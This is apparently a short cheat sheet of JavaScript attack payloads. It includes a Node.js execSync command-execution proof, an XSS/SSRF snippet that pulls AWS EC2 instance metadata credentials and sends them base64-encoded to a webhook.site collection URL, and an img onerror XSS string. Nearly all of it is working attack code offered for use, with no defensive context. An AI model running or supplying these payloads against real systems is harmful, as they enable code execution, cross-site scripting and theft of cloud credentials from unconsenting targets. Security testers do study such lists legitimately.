## JavaScript  

```
((require("child_process")).execSync("id >> /tmp/rce")) // Run 'id' command and write output to /tmp/rce file/

```  

**XSS/SSRF, get AWS Metadata**
```
fetch('https://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance/').then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    return response.text();
  })
  .then(data => {
    fetch('https://webhook.site/be931f11-1614-4853-9b15-684ecf37d18e/data=' + btoa(encodeURIComponent(data)));
    console.log(data);
  });
```

**XSS**:  
```<22 foo="<img src=1 onerror=alert(1)>">test</22>```
